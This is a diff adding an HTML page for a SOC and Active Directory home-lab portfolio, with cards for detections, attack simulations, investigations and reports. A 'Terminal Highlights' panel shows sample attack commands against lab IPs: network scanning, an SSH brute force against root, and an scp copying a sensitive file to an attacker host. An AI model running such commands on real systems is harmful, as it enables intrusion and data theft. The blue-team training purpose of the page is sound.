@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enterprise AD + SOC Lab | Repository-Driven Netflix Dashboard</title>
+  <link rel="stylesheet" href="./style.css" />
+</head>
+<body>
+  <nav class="nav">
+    <div class="nav-inner">
+      <div class="brand-wrap">
+        <div class="brand-badge">SOC</div>
+        <div>
+          <div class="brand-title">Enterprise AD + SOC Lab</div>
+          <div class="brand-sub">Repository-driven Netflix-style SOC portfolio</div>
+        </div>
+      </div>
+      <div class="nav-links">
+        <a href="#docs">Docs</a>
+        <a href="#architecture">Architecture</a>
+        <a href="#infrastructure">Infrastructure</a>
+        <a href="#detections">Detections</a>
+        <a href="#simulations">Simulations</a>
+        <a href="#investigations">Investigations</a>
+        <a href="#reports">Reports</a>
+        <a href="#evidence">Evidence</a>
+      </div>
+    </div>
+  </nav>
+
+  <header class="hero">
+    <div class="container">
+      <div class="hero-content">
+        <span class="eyebrow">Now Streaming: Enterprise AD • Detection Engineering • SOC Operations • Repository Walkthrough</span>
+        <h1>Enterprise AD + SOC Lab Repository Experience</h1>
+        <p>
+          A cinematic cybersecurity portfolio built around your real repository structure. This version turns the project into a Netflix-style browsing experience for docs, architecture, infrastructure build notes, detections, simulations, investigations, and SOC reporting using Wazuh, Security Onion, Sysmon, Suricata, Zeek, Kali, Linux, and Active Directory.
+        </p>
+        <div class="cta-row">
+          <a class="btn btn-primary" href="#simulations">▶ Browse Simulations</a>
+          <a class="btn btn-secondary" href="#docs">Open Repository Walkthrough</a>
+        </div>
+        <div class="hero-stats">
+          <div><strong>07</strong>repository lanes</div>
+          <div><strong>15+</strong>core project files</div>
+          <div><strong>06</strong>SOC content tracks</div>
+          <div><strong>Berlin</strong>junior SOC target roles</div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <section id="docs">
+    <div class="container">
+      <div class="section-head">
+        <h2>Docs</h2>
+        <p>This first row mirrors your documentation folder so a recruiter can browse the project scope, lab inventory, architecture, threat model, execution checklist, and analyst walkthrough like episodes.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">00-project-scope.md</span></div>
+              <h3>Project Scope</h3>
+              <p>High-level mission, goals, tooling boundaries, and what the enterprise lab is meant to demonstrate.</p>
+            </div>
+            <div class="hover-panel"><strong>Includes</strong><ul><li>project purpose</li><li>learning objectives</li><li>recruiter-facing summary</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">01-lab-inventory.md</span></div>
+              <h3>Lab Inventory</h3>
+              <p>VM list, host specs, network ranges, roles, sensors, and endpoint coverage in one quick view.</p>
+            </div>
+            <div class="hover-panel"><strong>Best use</strong><ul><li>shows planning depth</li><li>proves environment is real</li><li>great for interview explanation</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">04-threat-model.md</span></div>
+              <h3>Threat Model</h3>
+              <p>Adversary assumptions, attack paths, monitored assets, and priority detections mapped to your lab.</p>
+            </div>
+            <div class="hover-panel"><strong>Why it matters</strong><ul><li>shows security thinking</li><li>connects attacks to detections</li><li>supports ATT&amp;CK mapping</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">docs/</span><span class="pill">06-soc-analyst-walkthrough.md</span></div>
+              <h3>SOC Analyst Walkthrough</h3>
+              <p>Step-by-step analyst narrative from detection to evidence review, triage, and incident reporting.</p>
+            </div>
+            <div class="hover-panel"><strong>Perfect for demos</strong><ul><li>alert workflow</li><li>investigation storyline</li><li>manager-friendly structure</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="architecture">
+    <div class="container">
+      <div class="section-head">
+        <h2>Architecture</h2>
+        <p>This row maps directly to the architecture folder and is where you visually explain zones, system relationships, and diagrams.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">architecture/</span><span class="pill">00-overview.md</span></div>
+              <h3>Architecture Overview</h3>
+              <p>Executive view of the full lab and how the blue-team stack receives host and network telemetry.</p>
+            </div>
+            <div class="hover-panel"><strong>Show here</strong><ul><li>topology summary</li><li>log flow</li><li>trust boundaries</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">architecture/</span><span class="pill">01-network-zones.md</span></div>
+              <h3>Network Zones</h3>
+              <p>Attacker segment, monitored servers, clients, IDS sensors, and management traffic broken into clean zones.</p>
+            </div>
+            <div class="hover-panel"><strong>Best evidence</strong><ul><li>zone diagram</li><li>IP ranges</li><li>traffic direction</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">architecture/</span><span class="pill">02-system-relationships.md</span></div>
+              <h3>System Relationships</h3>
+              <p>Domain controller, Windows client, Ubuntu, Kali, Security Onion, and Wazuh relationships in one path.</p>
+            </div>
+            <div class="hover-panel"><strong>What recruiters see</strong><ul><li>infrastructure awareness</li><li>AD understanding</li><li>monitoring design</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="infrastructure">
+    <div class="container">
+      <div class="section-head">
+        <h2>Infrastructure Build</h2>
+        <p>This row turns your infrastructure folder into a bingeable build sequence from VM preparation through Wazuh and Docker.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">00-build-order.md</span></div>
+              <h3>Build Order</h3>
+              <p>The full deployment sequence so the project looks repeatable and professionally planned.</p>
+            </div>
+            <div class="hover-panel"><strong>Includes</strong><ul><li>phase order</li><li>dependencies</li><li>bootstrapping logic</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">03-windows-server-2025.md</span></div>
+              <h3>Windows Server 2025</h3>
+              <p>Domain services, DNS, baseline configuration, and security context for the enterprise side of the lab.</p>
+            </div>
+            <div class="hover-panel"><strong>Highlight</strong><ul><li>AD DS role</li><li>DNS setup</li><li>server baseline</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">07-security-onion.md</span></div>
+              <h3>Security Onion</h3>
+              <p>IDS setup, sensor placement, hunting interface, and how network detections enter the analyst workflow.</p>
+            </div>
+            <div class="hover-panel"><strong>Highlight</strong><ul><li>Suricata + Zeek</li><li>alert validation</li><li>sensor visibility</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">infrastructure/</span><span class="pill">08-wazuh.md</span></div>
+              <h3>Wazuh SIEM</h3>
+              <p>Centralized detection, host log ingestion, and the main SOC alerting layer for your portfolio stories.</p>
+            </div>
+            <div class="hover-panel"><strong>Highlight</strong><ul><li>agent coverage</li><li>alerting</li><li>SIEM dashboards</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="detections">
+    <div class="container">
+      <div class="section-head">
+        <h2>Detections</h2>
+        <p>This row is aligned to the detections folder and is where the project starts to look like true detection engineering, not just a lab build.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">00-detection-strategy.md</span></div>
+              <h3>Detection Strategy</h3>
+              <p>Coverage goals, telemetry sources, ATT&amp;CK priorities, and how the lab decides what to detect first.</p>
+            </div>
+            <div class="hover-panel"><strong>Why it matters</strong><ul><li>shows intentional design</li><li>links infra to detections</li><li>supports roadmap planning</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">01-wazuh-rules.md</span></div>
+              <h3>Wazuh Rules</h3>
+              <p>Custom host-based alerts for authentication anomalies, suspicious process execution, and lab-specific detection logic.</p>
+            </div>
+            <div class="hover-panel"><strong>Include later</strong><ul><li>rule IDs</li><li>alert screenshots</li><li>sample event payloads</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">02-sysmon.md</span></div>
+              <h3>Sysmon Coverage</h3>
+              <p>Windows telemetry strategy for process creation, network connections, and host activity needed for investigations.</p>
+            </div>
+            <div class="hover-panel"><strong>Include later</strong><ul><li>event IDs</li><li>config highlights</li><li>host evidence samples</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">detections/</span><span class="pill">03-security-onion-hunts.md</span></div>
+              <h3>Security Onion Hunts</h3>
+              <p>Hunt workflows for network scans, suspicious traffic, and correlation between Suricata alerts and Zeek logs.</p>
+            </div>
+            <div class="hover-panel"><strong>Include later</strong><ul><li>hunt queries</li><li>alert triage flow</li><li>network pivots</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="simulations">
+    <div class="container">
+      <div class="section-head">
+        <h2>Simulations</h2>
+        <p>This is your attack-simulation row, aligned to the simulations folder and ideal for the cinematic Netflix feel.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">01-reconnaissance.md</span></div>
+              <h3>Reconnaissance</h3>
+              <p>Nmap-style discovery, service probing, and the first signs of hostile awareness inside the lab.</p>
+            </div>
+            <div class="hover-panel"><strong>Examples</strong><ul><li>scan activity</li><li>Suricata / Zeek detections</li><li>T1046 mapping</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">02-bruteforce.md</span></div>
+              <h3>Brute Force</h3>
+              <p>Linux SSH and Windows logon failure scenarios designed for strong SIEM evidence and analyst reports.</p>
+            </div>
+            <div class="hover-panel"><strong>Examples</strong><ul><li>Hydra attempts</li><li>auth.log evidence</li><li>Event ID 4625</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">03-lateral-movement.md</span></div>
+              <h3>Lateral Movement</h3>
+              <p>Remote execution style behavior that proves the lab can model post-compromise analyst thinking.</p>
+            </div>
+            <div class="hover-panel"><strong>Examples</strong><ul><li>PsExec or WMI</li><li>Sysmon process traces</li><li>T1021 mapping</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">04-privilege-escalation.md</span></div>
+              <h3>Privilege Escalation</h3>
+              <p>Linux or Windows privilege abuse scenarios tied to host telemetry and suspicious activity review.</p>
+            </div>
+            <div class="hover-panel"><strong>Examples</strong><ul><li>sudo misuse</li><li>elevated activity</li><li>T1068 mapping</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">05-persistence.md</span></div>
+              <h3>Persistence</h3>
+              <p>Scheduled tasks, startup abuse, or account changes that demonstrate long-lived detection coverage.</p>
+            </div>
+            <div class="hover-panel"><strong>Examples</strong><ul><li>schtasks</li><li>new user creation</li><li>persistence artifacts</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"><div class="play">▶</div></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">simulations/</span><span class="pill">06-linux-attacks.md</span></div>
+              <h3>Linux Attacks</h3>
+              <p>Linux-centric attack activity covering auth abuse, shell execution, privilege actions, and host log evidence.</p>
+            </div>
+            <div class="hover-panel"><strong>Examples</strong><ul><li>auth anomalies</li><li>shell commands</li><li>forensic log pivots</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="investigations">
+    <div class="container">
+      <div class="section-head">
+        <h2>Investigations</h2>
+        <p>These are your case files. Each card can later open a dedicated case page built from the investigations folder.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">00-investigation-method.md</span></div>
+              <h3>Investigation Method</h3>
+              <p>The repeatable analyst process from alert validation through MITRE mapping and final incident summary.</p>
+            </div>
+            <div class="hover-panel"><strong>Core steps</strong><ul><li>alert review</li><li>evidence validation</li><li>case documentation</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">01-ssh-bruteforce-case.md</span></div>
+              <h3>SSH Brute Force Case</h3>
+              <p>One of the strongest recruiter-facing investigations because it clearly shows logs, SIEM correlation, and conclusion.</p>
+            </div>
+            <div class="hover-panel"><strong>Use here</strong><ul><li>auth.log screenshot</li><li>Wazuh alert</li><li>T1110 mapping</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">02-windows-logon-case.md</span></div>
+              <h3>Windows Logon Case</h3>
+              <p>Failed logon evidence from Windows Security logs, Sysmon coverage, and host context useful for SOC interviews.</p>
+            </div>
+            <div class="hover-panel"><strong>Use here</strong><ul><li>4625 evidence</li><li>user and host context</li><li>analyst notes</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">03-powershell-case.md</span></div>
+              <h3>PowerShell Case</h3>
+              <p>Windows script execution style casework that makes the portfolio feel closer to real-world blue-team investigations.</p>
+            </div>
+            <div class="hover-panel"><strong>Use here</strong><ul><li>Sysmon process creation</li><li>command-line evidence</li><li>T1059 mapping</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="reports">
+    <div class="container">
+      <div class="section-head">
+        <h2>Reports</h2>
+        <p>This row reflects the reports folder and reinforces that the project is not only about alerts, but about analyst communication and security reporting.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">reports/</span><span class="pill">00-weekly-soc-report-template.md</span></div>
+              <h3>Weekly SOC Report</h3>
+              <p>Reusable reporting structure for top alerts, notable trends, prioritized detections, and actions taken.</p>
+            </div>
+            <div class="hover-panel"><strong>Best use</strong><ul><li>shows communication skill</li><li>good for managers</li><li>easy to adapt to real work</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">reports/</span><span class="pill">01-incident-report-template.md</span></div>
+              <h3>Incident Report Template</h3>
+              <p>Clear structure for evidence, scope, ATT&amp;CK mapping, severity, and recommended next steps.</p>
+            </div>
+            <div class="hover-panel"><strong>Best use</strong><ul><li>attach case evidence</li><li>add screenshots</li><li>summarize impact</li></ul></div>
+          </article>
+
+          <article class="card">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">reports/</span><span class="pill">02-mitre-coverage-matrix.md</span></div>
+              <h3>MITRE Coverage Matrix</h3>
+              <p>Coverage view linking simulations, detections, and investigations to ATT&amp;CK techniques across the project.</p>
+            </div>
+            <div class="hover-panel"><strong>Best use</strong><ul><li>show detection maturity</li><li>prove structured thinking</li><li>highlight future gaps</li></ul></div>
+          </article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="container">
+      <div class="highlight-grid">
+        <div class="panel">
+          <h3>Repository Walkthrough Timeline</h3>
+          <div class="timeline">
+            <div class="step">
+              <div class="step-num">1</div>
+              <div><h3>Scope the Lab</h3><p>Start with project scope, lab inventory, and architecture so the lab has a clear enterprise story.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">2</div>
+              <div><h3>Build the Infrastructure</h3><p>Deploy Windows Server, Windows client, Ubuntu, Kali, Security Onion, and Wazuh in a repeatable order.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">3</div>
+              <div><h3>Implement Detections</h3><p>Add Wazuh rules, Sysmon coverage, and Security Onion hunts that support your selected attack stories.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">4</div>
+              <div><h3>Run Simulations and Cases</h3><p>Execute controlled attacks, collect screenshots, investigate alerts, and write incident reports.</p></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <h3>Terminal Highlights</h3>
+          <p>This panel gives the site the lab-operation feel you wanted and can later be replaced with a real walkthrough video of the repository, attack flow, and alert evidence.</p>
+          <div class="terminal">
+            <div><span class="prompt">$</span> <span class="cmd">nmap -sS -T4 192.168.20.0/24</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">hydra -l root -P rockyou.txt ssh://192.168.20.10</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">gobuster dir -u http://192.168.20.20 -w common.txt</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">scp sensitivefile attacker@kali:/tmp</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="evidence">
+    <div class="container">
+      <div class="section-head">
+        <h2>Evidence Gallery</h2>
+        <p>These placeholders are designed to match your screenshot checklist and execution checklist so the website stays aligned with the rest of the repository.</p>
+      </div>
+      <div class="gallery">
+        <div class="shot">Architecture Diagram</div>
+        <div class="shot">Wazuh Dashboard Overview</div>
+        <div class="shot">Security Onion Alerts</div>
+        <div class="shot">Suricata Nmap Detection</div>
+        <div class="shot">Linux auth.log Brute Force</div>
+        <div class="shot">Windows Event ID 4625</div>
+        <div class="shot">MITRE ATT&amp;CK Mapping</div>
+        <div class="shot">Incident Report Summary</div>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      This version is now customized around your real repository structure: docs, architecture, infrastructure, detections, simulations, investigations, reports, and website content presented as a Netflix-style GitHub Pages experience.
+    </div>
+  </footer>
+
+  <script src="./script.js"></script>
+</body>
+</html>
